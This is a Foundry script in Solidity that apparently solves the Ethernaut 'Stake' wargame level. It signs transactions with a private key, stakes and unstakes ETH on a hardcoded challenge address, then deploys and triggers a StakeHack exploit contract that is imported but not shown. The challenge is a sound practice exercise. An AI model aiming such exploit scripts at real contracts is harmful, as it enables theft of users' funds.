// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {StakeHack} from "ethernaut/stake_hack.sol";
import "forge-std/console.sol";

contract StakeHackScript is Script {

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address target = address(0x454C8947D486cF0dDdd812D651FD4A70F3C261b6);
        address weth = address(0x42A09C3fbfb22774936B5D5d085e2FA7963b0db8);

        target.call{value: 0.001 ether + 1}(abi.encodeWithSignature("StakeETH()"));
        target.call(abi.encodeWithSignature("Unstake(uint256)", 0.001 ether + 1));

        StakeHack stakeHack = new StakeHack{value: 0.001 ether + 1}(target, weth);
        stakeHack.hack();
        vm.stopBroadcast();
    }
}
